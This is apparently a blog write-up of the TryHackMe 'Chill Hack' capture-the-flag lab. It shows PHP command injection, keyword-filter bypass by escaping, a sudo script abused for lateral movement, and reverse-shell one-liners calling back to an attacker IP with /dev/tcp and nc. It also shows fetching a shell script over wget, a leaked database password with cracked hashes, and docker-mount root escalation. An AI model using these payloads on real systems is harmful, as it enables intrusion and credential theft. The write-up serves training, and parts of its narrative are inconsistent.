---
title: "Challenges: Chill Hack (TryHackMe)"
datePublished: Fri Jul 18 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmdoxrax6000002jxfgy8guku
slug: challenges-chill-hack-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1753817538923/99593c55-03c9-4113-81d8-84b3c2cd193d.png
tags: tryhackme, command-injection, web-exploitation, ctf-writeup, privilege-escalation

---

The *Chill Hack* machine on TryHackMe is an easy-level CTF focused on web exploitation, privilege escalation, and creative command injection techniques. The challenge starts with a seemingly harmless website, but deeper inspection reveals vulnerable PHP code that allows for command execution. From there, privilege escalation is achieved by abusing a misconfigured script, leading to root access. This room is a good practice in RCE exploitation, bypassing command filters, and Linux privilege escalation methods.

## Investigate!

**Chill the Hack out of the Machine.**

Easy level CTF.  Capture the flags and have fun!

### Answer the questions below

1. User Flag  
    

We started by scanning the target machine with:

`nmap -sV IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752866593945/8e6ebd23-9f71-4ca2-80ea-95bfa024e112.png align="center")

and enumerating web directories:  
  
`gobuster dir -u http://IP_Address -w /usr/share/wordlists/dirb/common.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804072766/dae65ab6-4fef-429a-90aa-0b3cccaafff0.png align="center")

One interesting path discovered was `/secret/`. Visiting it revealed an unusual behavior where adding `$(echo ls)` in the URL triggered an execution response.

Checking the site: `http://IP_Address/secret/`  
  
`$(echo ls)`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804295811/d765007b-9b29-4503-8ddb-c177a43d3394.png align="center")

`$(echo cat\ index.php)`  
  
This, among other commands, displays ‘*Are you a hacker?’* in red.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804405326/f082ce34-e280-42ed-b8a6-a1b229bc1897.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804437781/7c89ec17-f4ca-4d9a-b5ce-dff971106500.png align="center")

  
Viewing the source code showed a suspicious comment: `<!—?php echo shell_exec($cmd);?—>`. I tried to research what this would mean on ChatGPT:

```php
<!--?php echo shell_exec($cmd);?-->
```

🔸 This is a **commented-out PHP line**, but some servers **misinterpret or ignore malformed comments**, so `shell_exec($cmd)` **may still get executed**, especially if this is inside an eval or obfuscated logic.

🔸 The command is probably being passed from a query string, like:

```makefile
http://<ip>:<port>/index.php?cmd=ls
```

This indicated the page might be executing commands from a query string. Testing with:

```bash
/index.php?cmd=ls
/index.php?cmd=cat%20index.php
/index.php?cmd=whoami
```

---

### 🧠 Why You're Seeing “Are you a hacker?”

Because this line:

```html
<h1 style="color:red;">Are you a hacker?</h1>
```

...is just **static content** inside the `index.php`. It's reprinted every time the page reloads, which makes sense after triggering your new shell.

---

### ✅ Confirm Functionality

Try this:

```bash
/index.php?cmd=ls%20-la
/index.php?cmd=cat%20/etc/passwd
```

If it works, then:  

> 💥 You have Remote Code Execution (RCE) via shell\_exec() from a GET parameter!

`ftp IP_Address`  

`get note.txt`

`cat note.txt   `

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804460639/1e005d01-a5b6-4ddd-840e-b56ecd2d9e14.png align="center")

Anurodh told me that there is some filtering on strings being put in the command -- Apaar

`uname -a`

```makefile
Linux ip-10-10-167-107 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

We got a shell as `www-data`.

Checking `sudo -l` revealed a script executable by another user (`apaar`):  

`sudo -l`

```makefile
Matching Defaults entries for www-data on ip-10-10-167-107: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ip-10-10-167-107: (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

`$(echo cat\ /home/apaar/.helpline.sh)`

```makefile
#!/bin/bash echo echo 
"Welcome to helpdesk. Feel free to talk to anyone at any time!" echo read -p "Enter the person whom you want to talk with: " person read -p "Hello user! I am $person, Please enter your message: " msg $msg 2>/dev/null echo "Thank you for your precious time!”
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804486349/ea77cbca-0ec6-4e45-9f87-3c32a177e35c.png align="center")

`$(echo sudo\ -u apaar /home/apaar/.helpline.sh)`

```makefile
sudo -u apaar /home/apaar/.helpline.sh
```

`echo -e "someone\\nid" | sudo -u apaar /home/apaar/.helpline.sh`

```makefile
Welcome to helpdesk. Feel free to talk to anyone at any time! uid=1001(apaar) gid=1001(apaar) groups=1001(apaar) Thank you for your precious time!
```

`echo -e "bash -i >& /dev/tcp/..."`

```makefile
e bash -i >& /dev/tcp/...
```

### **Privilege Escalation**

While exploring, we found a note mentioning command filtering. Some words like `rm` or `cat` were blocked, but escaping them (e.g., `r\m` or `c\at`) bypassed the filter. This allowed us to upload a reverse shell:  

`echo -e "anyone\\n/bin/sh" | sudo -u apaar /home/apaar/.helpline.sh`  
  
Welcome to helpdesk. Feel free to talk to anyone at any time! Thank you for your precious time!

`echo '/bin/bash -i >& /dev/tcp/10.10.196.78/4444 0>&1' > [`[`shell.sh`](http://shell.sh)`](<`[`http://shell.sh/`](http://shell.sh/)`>) python3 -m http.server 80`

```makefile
Are you a hacker, red alert
```

and on the target:

`echo -e "anyone\\nwget <`[`http://10.10.65.21/shell.sh`](http://10.10.65.21/shell.sh)`> -O /tmp/`[`shell.sh`](http://shell.sh)`" | sudo -u apaar /home/apaar/.`[`helpline.sh`](http://helpline.sh)

```makefile
Welcome to helpdesk. Feel free to talk to anyone at any time! Thank you for your precious time!
```

`echo -e "anyone\\nbash /tmp/`[`shell.sh`](http://shell.sh)`" | sudo -u apaar /home/apaar/.`[`helpline.sh`](http://helpline.sh)

```makefile
Welcome to helpdesk. Feel free to talk to anyone at any time! Thank you for your precious time!
```

```makefile

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false apaar:x:1001:1001:,,,:/home/apaar:/bin/bash anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin systemd-timesync:x:113:116:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin tss:x:114:119:TPM software stack,,,:/var/lib/tpm:/bin/false tcpdump:x:115:120::/nonexistent:/usr/sbin/nologin usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin fwupd-refresh:x:117:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
```

Start a Netcat listener on port 4444:  
  
`nc -lvnp 4444`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753814533392/18410bd1-ac14-4c36-9287-d0b6238d5499.jpeg align="center")

On the site, use the command below once you’ve opened netcat at port 4444. Replace the `attack_machine_IP` and `PORT`

`r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attack_machine_IP> <PORT> >/tmp/f`  
  
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&1 | nc attack\_machine\_IP PORT &gt; /tmp/f

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804541965/52e33d73-0e25-458e-9c0d-085b93cfbb0c.png align="center")

> **Obfuscating commands like r\\m and c\\at was genius — it evaded the WAF (Web Application Firewall) or whatever filter was flagging classic patterns and keywords.**

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804603659/91547e1e-3c86-4745-8333-4ce33915094f.png align="center")

This script executed user input unsafely, enabling us to inject commands and upgrade to the `apaar` user:

  
Had to try to pass the right message over and over the next one worked well and eventually the flag was revealed:  
  
`sudo -u apaar /home/apaar/.helpline.sh`  

```bash
Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: /bin/sh 

/bin/sh 

Hello user! I am /bin/sh, Please enter your message: /bin/sh /

bin/sh 

id 

id 

uid=1001(apaar) gid=1001(apaar) groups=1001(apaar) python3 -c 'import pty;pty.spawn("/bin/bash")' python3 -c 'import pty;pty.spawn("/bin/bash")' apaar@ip-10-10-141-164:~$ pwd 

pwd /home/apaar 

apaar@ip-10-10-141-164:~$ cat local.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804642910/c2efe055-8357-41d2-ab27-744483885aa5.png align="center")

2. Root Flag
    
    ### Root Access  
      
    `ssh-keygen -f apaar`
    
    ```bash
    ssh-keygen -f apaar
    Generating public/private rsa key pair.
    Enter passphrase (empty for no passphrase):
    
    Enter same passphrase again:
    
    Your identification has been saved in apaar
    Your public key has been saved in apaar.pub
    The key fingerprint is:
    SHA256:qMval/CvZzYne1OvtaoSOE8ZU09mIe0IK3iK4NKo7Cg apaar@ip-10-10-141-164
    The key's randomart image is:
    +---[RSA 3072]----+
    |          ....   |
    |        . ..=    |
    |     .   + B     |
    |.   . o.+ . o    |
    |.+ . o.oS+       |
    |o.o o.o +   .    |
    |+   .o = . . ..  |
    |E. o .+ O +  ... |
    |+...+..*oB.ooo.  |
    +----[SHA256]-----+
    apaar@ip-10-10-141-164:~$ `ls`
    ls
    apaar  apaar.pub  local.txt
    apaar@ip-10-10-141-164:~$ `cat apaar.pub`
    ```
    
    ```bash
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKn82UJyZHR8vL/QDoDONnBPYqDXLpioIJzzgImTl25Zad0K8WwIY63v+o5rudtp99mkOOAOaveDEXsb1X3qrnv8n7ZL5JVdvdgo690VQ5M4oPNX+Whdmr+wVEK19MYCKV1HdqChGMifuM8gVzSjRmpUsECI8mQF2ERc2OUlIysxYfP0w4OCLORvXynzyvlYoP8UR4DqzQPCWeg7TntfMtE4m5oY1Dzlqk4dvoLHFpxHg+FGUSLCnbzN92K37nE0W05yoCg/qjsCvTXk3dql7GhNSD0/gpeHtujdsB3hPs4Q016gtPqqX7dX0xdiHW8ky2UBk//zV+j4izu/bghEu10C1D8CyEfd56jLCxHfeRE2v0IsYsQp445xG7Q7Db3CHL74FNobGV2M+P1kVaz3c1myy6n3jAn4iEgZRC05pOYlEduSHuglsNEdZ4HcT7bLAUHYgJK9S7JLZtu70MEy2QwbGcn+zSS3xqCwYFf2XztJbyCnOrf3HmJrVVFzofLpM= apaar@ip-10-10-141-164
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804780333/3156707d-4611-4816-9aab-c0fecdbca865.png align="center")
    
    In the next step had to use [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)  
      
    `find / -type f -name linpeas.sh 2>/dev/null`  
      
    `/opt/PEAS/linPEAS/linpeas.sh`  
      
    $PASSWORDTRY  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804809477/17168739-0ddb-4742-b149-e702e49096ce.png align="center")
    
    ```php
    <html>
    <body>
    <?php
    	if(isset($_POST['submit']))
    	{
    		$username = $_POST['username'];
    		$password = $_POST['password'];
    		ob_start();
    		session_start();
    		try
    		{
    			$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
    			$con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
    		}
    		catch(PDOException $e)
    		{
    			exit("Connection failed ". $e->getMessage());
    		}
    		require_once("account.php");
    		$account = new Account($con);
    		$success = $account->login($username,$password);
    		if($success)
    		{
    			header("Location: hacker.php");
    		}
    	}
    ?>
    <link rel="stylesheet" type="text/css" href="style.css">
    	<div class="signInContainer">
    		<div class="column">
    			<div class="header">
    				<h2 style="color:blue;">Customer Portal</h2>
    				<h3 style="color:green;">Log In<h3>
    			</div>
    			<form method="POST">
    				<?php echo $success?>
                    		<input type="text" name="username" id="username" placeholder="Username" required>
    				<input type="password" name="password" id="password" placeholder="Password" required>
    				<input type="submit" name="submit" value="Submit">
            		</form>
    		</div>
    	</div>
    </body>
    </html>
    ```
    
    With user-level access, we searched for credentials and found a database password inside a PHP file:
    
    ```sql
    !@m+her00+@db
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804899810/91ba9366-5f90-4c42-bc37-deb5d137967a.png align="center")
    
    `mysql -h localhost -uroot -p`  
      
    Enter password:  
      
    mysql&gt; `show databases;`  
    mysql&gt; `USE webportal;`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753804915406/c177813a-463d-4637-987e-541f179695d1.png align="center")
    
    mysql&gt; `SELECT * FROM users;`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753805096944/a3b9e64b-1911-4bfc-b93f-4602596e028b.png align="center")
    
    ```sql
    mysql> SELECT * FROM users;
    SELECT * FROM users;
    +----+-----------+----------+-----------+----------------------------------+
    | id | firstname | lastname | username  | password                         |
    +----+-----------+----------+-----------+----------------------------------+
    |  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd | masterpassword
    |  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |  dontaskdonttell
    +----+-----------+----------+-----------+----------------------------------+
    2 rows in set (0.00 sec)
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753805061251/b70d3435-c167-472c-8c19-6930bd03543e.png align="center")
    
    Use a Rainbow table like [Crackstation](https://crackstation.net/) to get the actual password  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753805123058/6f53570e-e4f4-4aa6-8a13-3d589747c09c.png align="center")
    
      
    `cd /var/www/html/secret`  
      
    `id`  
      
    `docker run -v /:/mnt —rm -it alpine chroot /mnt sh`  
      
    \# `whoami`
    
      
    \# `ls -la`
    
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753805257969/1f4e3856-9ef8-46fe-a216-050168de3513.png align="center")
    
    Using it to log in to MySQL exposed usernames and hashes, which, when cracked, provided additional credentials. Eventually, we identified an SSH key reuse issue, generated a new key pair, and escalated to root. The final flag was retrieved from `/root/proof.txt`.  
      
    `cat proof.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753805279851/ca0bf38e-cdb3-4a30-aba4-dff560f3129d.png align="center")
    
      
      
      
    Among all challenges I’ve done this was one of the most challenging ones. These resources came in handy while researching alongside ChatGPT:
    
    1. [https://medium.com/@saul\_x0/chill-hack-write-up-tryhackme-11c72e126197](https://medium.com/@saul_x0/chill-hack-write-up-tryhackme-11c72e126197)
        
    2. [https://systemweakness.com/thm-chill-hack-ac9bfddd7e76](https://systemweakness.com/thm-chill-hack-ac9bfddd7e76)
        
    3. [https://medium.com/@Inching-Towards-Intelligence/thm-chill-hack-19-100-44a59fbedc25](https://medium.com/@Inching-Towards-Intelligence/thm-chill-hack-19-100-44a59fbedc25)
        
    

This challenge demonstrates how small vulnerabilities like improperly handled command input (`shell_exec($cmd)`) can lead to full system compromise when combined with insecure scripts and weak credentials. It reinforces the importance of validating and sanitizing user inputs, implementing strict least-privilege principles, and restricting sensitive files and scripts. For learners, it’s an excellent example of chaining web exploitation with privilege escalation to achieve complete compromise.